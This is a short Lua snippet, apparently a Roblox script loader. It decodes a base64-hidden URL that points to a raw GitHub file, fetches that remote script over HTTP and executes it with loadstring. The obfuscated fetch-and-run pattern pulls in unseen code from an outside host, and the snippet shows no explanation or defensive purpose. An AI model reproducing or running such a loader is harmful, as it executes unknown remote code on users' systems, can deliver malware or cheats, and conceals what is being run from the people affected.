local encoded_b = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Nmay85OTQvRGYvcmVmcy9oZWFkcy9tYWluL0IubHVh"
local real_b_url = game:GetService("HttpService"):Base64Decode(encoded_b)
loadstring(game:HttpGet(real_b_url))()
